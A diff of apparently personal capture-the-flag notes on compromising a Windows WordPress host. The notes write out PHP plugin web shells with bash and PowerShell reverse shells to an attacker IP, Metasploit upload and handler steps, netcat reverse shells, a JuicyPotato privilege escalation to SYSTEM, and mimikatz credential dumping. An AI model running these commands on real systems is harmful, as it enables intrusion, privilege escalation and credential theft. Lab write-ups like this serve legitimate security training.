@@ -54,6 +54,7 @@ Well, that is lame... wp content admin is admin:P@s5w0rd! as on previous machine
 can uppload plugins right to the admin panel
 It does not work by some reason
 
+```
 <?php
 
 /**
@@ -67,10 +68,11 @@ It does not work by some reason
 
 exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
 ?>
-
+```
 
 Ohhh, come on! That is a windows machine...  
 
+```
 <?php  
 
 /**  
@@ -84,6 +86,7 @@ Ohhh, come on! That is a windows machine...
 
 echo shell_exec('powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.42/rs.ps1\");');
 ?>  
+```
 
 `sudo python3 -m http.server 80`  
 
@@ -135,8 +138,58 @@ msfconsole
 set payload php/meterpreter/reverse_tcp
 set lhost 10.10.14.42
 set lport 4444
+use exploit/multi/handler
+run
 ```
 
+inside of powershell  
+`Get-ExecutionPolicy`  
+RemoteSigned  
+`whoami /priv`   
+
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled  
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled  
+SeCreateGlobalPrivilege Create global objects                     Enabled  
 
 
 
+OK I gave up. Lets see what is on the walkthrough.  
+https://github.com/ohpe/juicy-potato  
+
+
+```
+msfconsole
+msf > use exploit/unix/webapp/wp_admin_shell_upload
+msf > set PASSWORD P@s5w0rd!
+msf > set USERNAME admin
+msf > set TARGETURI /wordpress
+msf > set RHOSTS 10.10.10.29
+msf > run
+```
+Auto wp-admin connect+upload+revshell  
+
+`meterpreter > cd C:/inetpub/wwwroot/wordpress/wp-content/uploads`  
+`meterpreter > upload nc.exe`  
+`nc -lvp 1234`  
+`meterpreter > execute -f nc.exe -a "-e cmd.exe 10.10.14.2 1234"`  
+Actual cmd revshell  
+
+Uppload cve  
+`meterpreter > upload JuicyPotato.exe`  
+`echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.2 1111 > shell.bat`  
+This will create a batch file to run a cve.exe and to establish the new admin revshell  
+`nc -lvp 1111`  
+when it is connected to the local machine 1111 port   
+`js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337`  
+In the new shell  
+`whoami`  
+nt authority\system   
+`cat root.txt`  
+6e9a9fdc6f64e410a68b847bb4b404fa  
+
+Some postex  
+`msf > upload mimikatz.exe`  
+`./mimikatz.exe`  
+sekurlsa::logonpasswords  
+
+And we find the password `Password1234!` for domain user `Sandra`.  
